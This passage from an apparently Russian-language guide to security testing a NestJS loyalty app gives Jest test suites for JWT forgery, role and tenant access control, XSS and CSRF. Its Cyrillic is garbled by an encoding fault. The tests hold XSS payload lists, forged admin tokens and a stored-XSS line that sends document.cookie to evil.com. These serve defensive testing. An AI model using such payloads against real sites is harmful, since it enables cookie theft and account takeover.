**ะะพะฝัะตะบัั:** JWT token ะธัะฟะพะปัะทัะตััั ะดะปั authentication.

**ะะพะฟัะพั:** Security tests?

- A) Verify JWT signature
- B) Test token expiration (ะฟัะพะฒะตัะธัั ััะพ expired tokens rejected)
- C) B + test token tampering (ะธะทะผะตะฝะธัั payload โ rejected)
- D) C + test token theft (ะฟัะพะฒะตัะธัั refresh token rotation)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- JWT tampering ะดะพะปะถะตะฝ ะฑััั ะฝะตะฒะพะทะผะพะถะตะฝ (signature verification)
- Token expiration ะบัะธัะธัะตะฝ ะดะปั security
- Refresh token rotation ะทะฐัะธัะฐะตั ะพั token theft

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/jwt-security.security.spec.ts
import * as jwt from 'jsonwebtoken';

describe('JWT Token Security', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Valid Token
  it('should accept valid JWT token', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(response.body).toBeDefined();
  });

  // Test 2: Expired Token
  it('should reject expired JWT token', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { expiresIn: '-1h' } // Expired 1 hour ago
    );

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(401);

    expect(response.body.message).toContain('expired');
  });

  // Test 3: Token Tampering (Modified Payload)
  it('should reject tampered JWT token', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    // Decode and modify payload
    const [header, payload, signature] = token.split('.');
    const decodedPayload = JSON.parse(Buffer.from(payload, 'base64').toString());
    
    // Change role to ADMIN
    decodedPayload.role = 'ADMIN';
    
    const tamperedPayload = Buffer.from(JSON.stringify(decodedPayload)).toString('base64');
    const tamperedToken = `${header}.${tamperedPayload}.${signature}`;

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${tamperedToken}`)
      .expect(401);

    expect(response.body.message).toContain('invalid');
    console.log('โ Token tampering detected and rejected');
  });

  // Test 4: Wrong Secret
  it('should reject token signed with wrong secret', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'ADMIN', tenantId: 'tenant-1' },
      'wrong-secret', // Wrong secret!
      { expiresIn: '1h' }
    );

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${token}`)
      .expect(401);

    expect(response.body.message).toContain('invalid');
  });

  // Test 5: None Algorithm Attack
  it('should reject "none" algorithm JWT', async () => {
    // Create token with "none" algorithm (bypasses signature check)
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');
    const payload = Buffer.from(JSON.stringify({
      userId: 'user-1',
      role: 'ADMIN',
      tenantId: 'tenant-1',
    })).toString('base64');

    const noneToken = `${header}.${payload}.`;

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${noneToken}`)
      .expect(401);

    expect(response.body.message).toContain('invalid');
    console.log('โ "none" algorithm attack blocked');
  });

  // Test 6: Token Refresh (Rotation)
  it('should rotate refresh tokens on use', async () => {
    // Step 1: Login to get refresh token
    const loginResponse = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({
        phone: '+79991234567',
        password: 'test123',
      })
      .expect(200);

    const refreshToken1 = loginResponse.body.refreshToken;

    // Step 2: Use refresh token to get new access token
    const refreshResponse1 = await request(app.getHttpServer())
      .post('/api/v1/auth/refresh')
      .send({ refreshToken: refreshToken1 })
      .expect(200);

    const refreshToken2 = refreshResponse1.body.refreshToken;

    // Step 3: Verify new refresh token is different (rotation)
    expect(refreshToken2).not.toBe(refreshToken1);

    // Step 4: Old refresh token should be invalidated
    await request(app.getHttpServer())
      .post('/api/v1/auth/refresh')
      .send({ refreshToken: refreshToken1 })
      .expect(401);

    console.log('โ Refresh token rotation working');
  });

  // Test 7: Token Reuse Detection
  it('should detect token reuse (token theft)', async () => {
    const loginResponse = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({
        phone: '+79991234567',
        password: 'test123',
      })
      .expect(200);

    const refreshToken = loginResponse.body.refreshToken;

    // Use refresh token twice
    await request(app.getHttpServer())
      .post('/api/v1/auth/refresh')
      .send({ refreshToken })
      .expect(200);

    // Second use should fail (token reuse)
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/refresh')
      .send({ refreshToken })
      .expect(401);

    expect(response.body.message).toContain('reused');
    
    // Security action: invalidate all tokens for this user
    console.log('โ๏ธ Token reuse detected - all sessions invalidated');
  });

  // Test 8: JWT Claims Validation
  it('should validate required JWT claims', async () => {
    // Missing required claims
    const tokenNoUserId = jwt.sign(
      { role: 'GUEST', tenantId: 'tenant-1' }, // Missing userId
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenNoUserId}`)
      .expect(401);

    const tokenNoRole = jwt.sign(
      { userId: 'user-1', tenantId: 'tenant-1' }, // Missing role
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenNoRole}`)
      .expect(401);

    console.log('โ Required claims validated');
  });

  // Test 9: Token Issuer/Audience Validation
  it('should validate token issuer and audience', async () => {
    const tokenWrongIssuer = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { 
        expiresIn: '1h',
        issuer: 'wrong-issuer', // Wrong issuer
        audience: 'max-loyalty-api',
      }
    );

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenWrongIssuer}`)
      .expect(401);

    console.log('โ Issuer/Audience validation working');
  });

  // Test 10: Token Blacklisting (Logout)
  it('should blacklist token on logout', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    // Token works before logout
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Logout
    await request(app.getHttpServer())
      .post('/api/v1/auth/logout')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Token should be blacklisted after logout
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(401);

    expect(response.body.message).toContain('blacklisted');
    console.log('โ Token blacklisting on logout working');
  });

  // Test 11: Short-lived Access Token + Long-lived Refresh Token
  it('should use different TTL for access and refresh tokens', async () => {
    const loginResponse = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({
        phone: '+79991234567',
        password: 'test123',
      })
      .expect(200);

    const accessToken = loginResponse.body.accessToken;
    const refreshToken = loginResponse.body.refreshToken;

    // Decode tokens to check expiration
    const accessDecoded = jwt.decode(accessToken) as any;
    const refreshDecoded = jwt.decode(refreshToken) as any;

    const accessTTL = accessDecoded.exp - accessDecoded.iat;
    const refreshTTL = refreshDecoded.exp - refreshDecoded.iat;

    console.log('=== Token TTL ===');
    console.log(`Access token: ${accessTTL / 60} minutes`);
    console.log(`Refresh token: ${refreshTTL / 60 / 60} hours`);

    // Access token: 15 min, Refresh token: 7 days
    expect(accessTTL).toBe(15 * 60); // 15 minutes
    expect(refreshTTL).toBe(7 * 24 * 60 * 60); // 7 days
  });

  // Test 12: Prevent JWT Confusion Attack (Algorithm Confusion)
  it('should prevent algorithm confusion attack', async () => {
    // Attack: Change HS256 to RS256 (use public key as secret)
    const publicKey = fs.readFileSync(path.join(__dirname, 'public.key'), 'utf8');

    try {
      // Attacker signs with RS256 using public key
      const maliciousToken = jwt.sign(
        { userId: 'user-1', role: 'ADMIN', tenantId: 'tenant-1' },
        publicKey,
        { algorithm: 'RS256' }
      );

      await request(app.getHttpServer())
        .get('/api/v1/admin/guests')
        .set('Authorization', `Bearer ${maliciousToken}`)
        .expect(401);

      console.log('โ Algorithm confusion attack blocked');
    } catch (error) {
      // Expected to fail
    }
  });
});
```


***

### **33. Authorization - role-based access?**

**ะะพะฝัะตะบัั:** GUEST ะฝะต ะดะพะปะถะตะฝ ะฒะธะดะตัั admin endpoints.

**ะะพะฟัะพั:** Security tests?

- A) Test GUEST โ `/admin` โ 403 Forbidden
- B) Test MANAGER โ Owner-only endpoint โ 403
- C) B + test horizontal privilege escalation (Guest A โ Guest B data)
- D) C + test IDOR (Insecure Direct Object Reference)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Role-based authorization ะบัะธัะธัะตะฝ
- Horizontal privilege escalation = ัะฐััะฐั ััะทะฒะธะผะพััั
- IDOR = top OWASP vulnerability

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/authorization.security.spec.ts
describe('Authorization - Role-Based Access Control', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Guest Cannot Access Admin Endpoints
  it('should block GUEST from admin endpoints', async () => {
    const guestToken = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const adminEndpoints = [
      '/api/v1/admin/guests',
      '/api/v1/admin/promos',
      '/api/v1/admin/reports',
      '/api/v1/admin/settings',
    ];

    for (const endpoint of adminEndpoints) {
      const response = await request(app.getHttpServer())
        .get(endpoint)
        .set('Authorization', `Bearer ${guestToken}`)
        .expect(403);

      expect(response.body.message).toContain('Forbidden');
    }

    console.log(`โ Blocked GUEST from ${adminEndpoints.length} admin endpoints`);
  });

  // Test 2: Manager Cannot Access Owner Endpoints
  it('should block MANAGER from owner-only endpoints', async () => {
    const managerToken = jwt.sign(
      { userId: 'manager-1', role: 'MANAGER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const ownerEndpoints = [
      '/api/v1/admin/tenants/settings',
      '/api/v1/admin/billing',
      '/api/v1/admin/users/invite',
    ];

    for (const endpoint of ownerEndpoints) {
      await request(app.getHttpServer())
        .get(endpoint)
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(403);
    }

    console.log('โ MANAGER blocked from owner-only endpoints');
  });

  // Test 3: Horizontal Privilege Escalation (Guest A โ Guest B)
  it('should prevent horizontal privilege escalation', async () => {
    const guestAToken = jwt.sign(
      { userId: 'user-a', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to access Guest B's data
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/profile/user-b') // Different user!
      .set('Authorization', `Bearer ${guestAToken}`)
      .expect(403);

    expect(response.body.message).toContain('not authorized');
    console.log('โ Horizontal privilege escalation blocked');
  });

  // Test 4: IDOR (Insecure Direct Object Reference)
  it('should prevent IDOR attacks', async () => {
    const guestAToken = jwt.sign(
      { userId: 'user-a', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to access another guest's transaction
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/transactions/tx-belongs-to-user-b') // Transaction belongs to user-b
      .set('Authorization', `Bearer ${guestAToken}`)
      .expect(403);

    expect(response.body.message).toContain('not authorized');
    console.log('โ IDOR attack blocked');
  });

  // Test 5: Tenant Isolation
  it('should isolate data between tenants', async () => {
    const tenant1Token = jwt.sign(
      { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to access tenant-2's data
    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests?tenantId=tenant-2') // Different tenant!
      .set('Authorization', `Bearer ${tenant1Token}`)
      .expect(403);

    expect(response.body.message).toContain('not authorized');
    console.log('โ Tenant isolation working');
  });

  // Test 6: Privilege Escalation via Parameter Tampering
  it('should prevent privilege escalation via parameter tampering', async () => {
    const guestToken = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to set role=ADMIN in request body
    const response = await request(app.getHttpServer())
      .patch('/api/v1/guest/profile')
      .set('Authorization', `Bearer ${guestToken}`)
      .send({
        firstName: 'John',
        role: 'ADMIN', // โ Try to escalate privileges
      })
      .expect(200);

    // Verify role was NOT changed
    const user = await prisma.user.findUnique({ where: { id: 'user-1' } });
    expect(user.role).toBe('GUEST'); // Still GUEST

    console.log('โ Parameter tampering privilege escalation blocked');
  });

  // Test 7: Mass Assignment Vulnerability
  it('should prevent mass assignment attacks', async () => {
    const guestToken = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to modify protected fields
    await request(app.getHttpServer())
      .patch('/api/v1/guest/card')
      .set('Authorization', `Bearer ${guestToken}`)
      .send({
        totalBalance: 1000000, // โ Protected field
        totalEarned: 500000, // โ Protected field
      })
      .expect(400); // Bad Request

    console.log('โ Mass assignment blocked');
  });

  // Test 8: Role Hierarchy Enforcement
  it('should enforce role hierarchy', async () => {
    const roles = ['GUEST', 'MANAGER', 'ADMIN', 'OWNER'];

    for (let i = 0; i < roles.length; i++) {
      const currentRole = roles[i];
      const token = jwt.sign(
        { userId: `user-${i}`, role: currentRole, tenantId: 'tenant-1' },
        process.env.JWT_SECRET
      );

      // Check access to each level
      for (let j = 0; j < roles.length; j++) {
        const requiredRole = roles[j];
        const endpoint = `/api/v1/test/role/${requiredRole}`;

        const response = await request(app.getHttpServer())
          .get(endpoint)
          .set('Authorization', `Bearer ${token}`);

        if (i >= j) {
          // Current role >= required role โ should succeed
          expect(response.status).toBe(200);
        } else {
          // Current role < required role โ should fail
          expect(response.status).toBe(403);
        }
      }
    }

    console.log('โ Role hierarchy enforced');
  });

  // Test 9: Context-Based Authorization
  it('should apply context-based authorization', async () => {
    const guestToken = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Guest can view their own active card
    await request(app.getHttpServer())
      .get('/api/v1/guest/card')
      .set('Authorization', `Bearer ${guestToken}`)
      .expect(200);

    // Guest CANNOT delete their own card (business rule)
    await request(app.getHttpServer())
      .delete('/api/v1/guest/card')
      .set('Authorization', `Bearer ${guestToken}`)
      .expect(403);

    console.log('โ Context-based authorization working');
  });

  // Test 10: Automated Authorization Matrix Testing
  it('should test authorization matrix', async () => {
    const authMatrix = [
      // [role, endpoint, method, expectedStatus]
      ['GUEST', '/api/v1/guest/balance', 'GET', 200],
      ['GUEST', '/api/v1/admin/guests', 'GET', 403],
      ['MANAGER', '/api/v1/admin/guests', 'GET', 200],
      ['MANAGER', '/api/v1/admin/tenants/settings', 'GET', 403],
      ['ADMIN', '/api/v1/admin/tenants/settings', 'GET', 200],
      ['ADMIN', '/api/v1/admin/billing', 'GET', 403],
      ['OWNER', '/api/v1/admin/billing', 'GET', 200],
    ];

    for (const [role, endpoint, method, expectedStatus] of authMatrix) {
      const token = jwt.sign(
        { userId: `user-${role}`, role, tenantId: 'tenant-1' },
        process.env.JWT_SECRET
      );

      const response = await request(app.getHttpServer())
        [method.toLowerCase()](endpoint)
        .set('Authorization', `Bearer ${token}`);

      expect(response.status).toBe(expectedStatus);
    }

    console.log('โ Authorization matrix validated');
  });
});
```


***

ะัะพะดะพะปะถะฐั ั ะฒะพะฟัะพัะฐะผะธ **34-40** (ะพััะฐะปัะฝัะต Security Testing)? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **34. XSS (Cross-Site Scripting) - input sanitization?**

**ะะพะฝัะตะบัั:** Guest ะผะพะถะตั ะฒะฒะตััะธ firstName ะฒ profile.

**ะะพะฟัะพั:** Security tests?

```
- A) Test basic XSS: `<script>alert('XSS')</script>`
```

- B) Test stored XSS (ัะพััะฐะฝะธัั โ ะพัะพะฑัะฐะทะธัั โ execute?)
- C) B + test DOM-based XSS
- D) C + test XSS ะฒ ัะฐะทะฝัั ะบะพะฝัะตะบััะฐั (HTML, JS, URL)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Stored XSS ัะฐะผัะน ะพะฟะฐัะฝัะน (persists ะฒ DB)
- DOM-based XSS ัะฐััะพ ะฟัะพะฟััะบะฐัั
- XSS ะฒ ัะฐะทะฝัั ะบะพะฝัะตะบััะฐั ััะตะฑัะตั ัะฐะทะฝะพะน sanitization

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/xss.security.spec.ts
describe('XSS (Cross-Site Scripting) Protection', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Basic XSS (Reflected)
  it('should sanitize basic XSS payloads', async () => {
    const token = generateGuestToken();

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
    ];

    for (const payload of xssPayloads) {
      const response = await request(app.getHttpServer())
        .patch('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: payload })
        .expect(200);

      // Verify stored value is sanitized
      const user = await prisma.user.findUnique({
        where: { id: 'user-1' },
        include: { guestProfile: true },
      });

      expect(user.guestProfile.firstName).not.toContain('<script>');
      expect(user.guestProfile.firstName).not.toContain('onerror');
      expect(user.guestProfile.firstName).not.toContain('javascript:');
    }

    console.log(`โ Sanitized ${xssPayloads.length} XSS payloads`);
  });

  // Test 2: Stored XSS
  it('should prevent stored XSS attacks', async () => {
    const token = generateGuestToken();

    // Step 1: Store malicious payload
    const maliciousPayload = '<img src=x onerror="fetch(\'https://evil.com/?cookie=\'+document.cookie)">';

    await request(app.getHttpServer())
      .patch('/api/v1/guest/profile')
      .set('Authorization', `Bearer ${token}`)
      .send({ firstName: maliciousPayload })
      .expect(200);

    // Step 2: Retrieve data (should be sanitized)
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/profile')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(response.body.firstName).not.toContain('onerror');
    expect(response.body.firstName).not.toContain('fetch');
    expect(response.body.firstName).not.toContain('<img');

    console.log('โ Stored XSS blocked');
  });

  // Test 3: DOM-based XSS (via URL parameters)
  it('should sanitize URL parameters', async () => {
    const maliciousParam = encodeURIComponent('<script>alert("XSS")</script>');

    const response = await request(app.getHttpServer())
      .get(`/api/v1/search?q=${maliciousParam}`)
      .expect(200);

    // Response should not contain unsanitized script
    expect(response.text).not.toContain('<script>');
    console.log('โ DOM-based XSS via URL blocked');
  });

  // Test 4: XSS in Different Contexts
  it('should sanitize XSS in HTML context', async () => {
    const token = generateGuestToken();

    const htmlPayloads = [
      '<b onmouseover=alert("XSS")>Bold</b>',
      '<a href="javascript:alert(\'XSS\')">Click</a>',
      '<div style="background-image: url(javascript:alert(\'XSS\'))">',
    ];

    for (const payload of htmlPayloads) {
      await request(app.getHttpServer())
        .patch('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: payload })
        .expect(200);

      const user = await prisma.user.findUnique({
        where: { id: 'user-1' },
        include: { guestProfile: true },
      });

      expect(user.guestProfile.firstName).not.toContain('javascript:');
      expect(user.guestProfile.firstName).not.toContain('onmouseover');
    }

    console.log('โ HTML context XSS blocked');
  });

  // Test 5: XSS in JavaScript Context
  it('should sanitize XSS in JS context', async () => {
    const jsPayloads = [
      '"; alert("XSS"); //',
      '\'; alert("XSS"); //',
      '</script><script>alert("XSS")</script>',
    ];

    for (const payload of jsPayloads) {
      const response = await request(app.getHttpServer())
        .get(`/api/v1/guest/config?callback=${encodeURIComponent(payload)}`)
        .expect(200);

      expect(response.text).not.toContain('alert(');
    }

    console.log('โ JavaScript context XSS blocked');
  });

  // Test 6: XSS via File Upload
  it('should sanitize filenames for XSS', async () => {
    const token = generateAdminToken();

    const maliciousFilename = '<script>alert("XSS")</script>.csv';

    const filePath = path.join(__dirname, maliciousFilename);
    fs.writeFileSync(filePath, 'test,data\n1,2');

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(200);

    expect(response.body.filename).not.toContain('<script>');
    expect(response.body.filename).not.toContain('alert');

    fs.unlinkSync(filePath);
    console.log('โ Filename XSS blocked');
  });

  // Test 7: Mutation XSS (mXSS)
  it('should prevent mutation XSS attacks', async () => {
    const token = generateGuestToken();

    const mxssPayloads = [
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>',
      '<style><img src=x onerror=alert(1)></style>',
    ];

    for (const payload of mxssPayloads) {
      await request(app.getHttpServer())
        .patch('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: payload })
        .expect(200);

      const user = await prisma.user.findUnique({
        where: { id: 'user-1' },
        include: { guestProfile: true },
      });

      expect(user.guestProfile.firstName).not.toContain('onerror');
    }

    console.log('โ Mutation XSS blocked');
  });

  // Test 8: Unicode XSS
  it('should block unicode XSS attacks', async () => {
    const token = generateGuestToken();

    const unicodePayloads = [
      '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
      '<script>alert\u0028"XSS"\u0029</script>',
      '\uFF1Cscript\uFF1Ealert("XSS")\uFF1C/script\uFF1E', // Fullwidth chars
    ];

    for (const payload of unicodePayloads) {
      await request(app.getHttpServer())
        .patch('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: payload })
        .expect(200);

      const user = await prisma.user.findUnique({
        where: { id: 'user-1' },
        include: { guestProfile: true },
      });

      expect(user.guestProfile.firstName).not.toContain('script');
    }

    console.log('โ Unicode XSS blocked');
  });

  // Test 9: CSP (Content Security Policy) Headers
  it('should set CSP headers to prevent XSS', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['content-security-policy']).toBeDefined();
    expect(response.headers['content-security-policy']).toContain("script-src 'self'");
    expect(response.headers['content-security-policy']).toContain("object-src 'none'");

    console.log('โ CSP headers set correctly');
  });

  // Test 10: XSS Automated Scanning
  it('should scan for XSS vulnerabilities', async () => {
    const endpoints = [
      { path: '/api/v1/guest/profile', method: 'PATCH', param: 'firstName' },
      { path: '/api/v1/guest/profile', method: 'PATCH', param: 'lastName' },
      { path: '/api/v1/search', method: 'GET', param: 'q' },
    ];

    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
    ];

    let vulnerabilities = 0;

    for (const endpoint of endpoints) {
      for (const payload of xssPayloads) {
        const token = generateGuestToken();

        const response = endpoint.method === 'GET'
          ? await request(app.getHttpServer())
              .get(`${endpoint.path}?${endpoint.param}=${encodeURIComponent(payload)}`)
              .set('Authorization', `Bearer ${token}`)
          : await request(app.getHttpServer())
              .patch(endpoint.path)
              .set('Authorization', `Bearer ${token}`)
              .send({ [endpoint.param]: payload });

        // Check if payload appears unescaped in response
        if (
          response.text.includes(payload) ||
          response.text.includes('<script>') ||
          response.text.includes('onerror=')
        ) {
          vulnerabilities++;
          console.log(`โ๏ธ XSS vulnerability: ${endpoint.path} (${endpoint.param})`);
        }
      }
    }

    console.log(`=== XSS Scan Results ===`);
    console.log(`Endpoints tested: ${endpoints.length}`);
    console.log(`Payloads tested: ${xssPayloads.length}`);
    console.log(`Vulnerabilities found: ${vulnerabilities}`);

    expect(vulnerabilities).toBe(0);
  });
});

function generateGuestToken(): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}

function generateAdminToken(): string {
  return jwt.sign(
    { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

### **35. CSRF (Cross-Site Request Forgery) - token validation?**

**ะะพะฝัะตะบัั:** State-changing ะพะฟะตัะฐัะธะธ (POST, PATCH, DELETE).

**ะะพะฟัะพั:** Security tests?

- A) Test POST request ะฑะตะท CSRF token โ reject
- B) Test POST ั invalid CSRF token โ reject
- C) Test POST ั valid CSRF token โ success
- D) C + test double-submit cookie pattern

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- CSRF ะบัะธัะธัะตะฝ ะดะปั state-changing operations
- Invalid/missing token ะดะพะปะถะตะฝ ะฑะปะพะบะธัะพะฒะฐัััั
- Double-submit cookie = ะดะพะฟะพะปะฝะธัะตะปัะฝะฐั ะทะฐัะธัะฐ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/csrf.security.spec.ts
import * as csrf from 'csurf';

describe('CSRF (Cross-Site Request Forgery) Protection', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    
    // Enable CSRF protection
    app.use(csrf({ cookie: true }));
    
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: GET request without CSRF token (should work)
  it('should allow GET requests without CSRF token', async () => {
    const token = generateGuestToken();

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    console.log('โ GET request allowed without CSRF token');
  });

  // Test 2: POST request without CSRF token (should fail)
  it('should reject POST without CSRF token', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .post('/api/v1/guest/redeem')
      .set('Authorization', `Bearer ${token}`)
      .send({ amount: 100 })
      .expect(403);

    expect(response.body.message).toContain('CSRF');
    console.log('โ POST without CSRF token rejected');
  });

  // Test 3: POST with invalid CSRF token
  it('should reject POST with invalid CSRF token', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .post('/api/v1/guest/redeem')
      .set('Authorization', `Bearer ${token}`)
      .set('X-CSRF-Token', 'invalid-token')
      .send({ amount: 100 })
      .expect(403);

    expect(response.body.message).toContain('CSRF');
    console.log('โ Invalid CSRF token rejected');
  });

  // Test 4: POST with valid CSRF token (should work)
  it('should allow POST with valid CSRF token', async () => {
    const token = generateGuestToken();

    // Step 1: Get CSRF token
    const csrfResponse = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const csrfToken = csrfResponse.body.csrfToken;
    const cookies = csrfResponse.headers['set-cookie'];

    // Step 2: Use CSRF token in POST request
    await request(app.getHttpServer())
      .post('/api/v1/guest/redeem')
      .set('Authorization', `Bearer ${token}`)
      .set('X-CSRF-Token', csrfToken)
      .set('Cookie', cookies)
      .send({ amount: 100 })
      .expect(200);

    console.log('โ Valid CSRF token accepted');
  });

  // Test 5: CSRF token reuse (should fail after logout)
  it('should invalidate CSRF token on logout', async () => {
    const token = generateGuestToken();

    // Get CSRF token
    const csrfResponse = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const csrfToken = csrfResponse.body.csrfToken;
    const cookies = csrfResponse.headers['set-cookie'];

    // Logout
    await request(app.getHttpServer())
      .post('/api/v1/auth/logout')
      .set('Authorization', `Bearer ${token}`)
      .set('X-CSRF-Token', csrfToken)
      .set('Cookie', cookies)
      .expect(200);

    // Try to reuse CSRF token (should fail)
    const newToken = generateGuestToken();

    await request(app.getHttpServer())
      .post('/api/v1/guest/redeem')
      .set('Authorization', `Bearer ${newToken}`)
      .set('X-CSRF-Token', csrfToken)
      .set('Cookie', cookies)
      .expect(403);

    console.log('โ CSRF token invalidated on logout');
  });

  // Test 6: Double-Submit Cookie Pattern
  it('should validate double-submit cookie', async () => {
    const token = generateGuestToken();

    // Get CSRF token (stored in cookie AND returned in response)
    const csrfResponse = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const csrfToken = csrfResponse.body.csrfToken;
    const cookies = csrfResponse.headers['set-cookie'];

    // Extract CSRF from cookie
    const csrfCookie = cookies.find((c: string) => c.startsWith('XSRF-TOKEN='));
    const csrfFromCookie = csrfCookie.split('=')[1].split(';')[0];

    // Verify token in response matches cookie
    expect(csrfToken).toBe(decodeURIComponent(csrfFromCookie));

    console.log('โ Double-submit cookie pattern validated');
  });

  // Test 7: CSRF token per-session
  it('should generate unique CSRF token per session', async () => {
    const token1 = generateGuestToken();
    const token2 = generateGuestToken();

    const csrf1 = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token1}`)
      .expect(200);

    const csrf2 = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token2}`)
      .expect(200);

    expect(csrf1.body.csrfToken).not.toBe(csrf2.body.csrfToken);
    console.log('โ Unique CSRF token per session');
  });

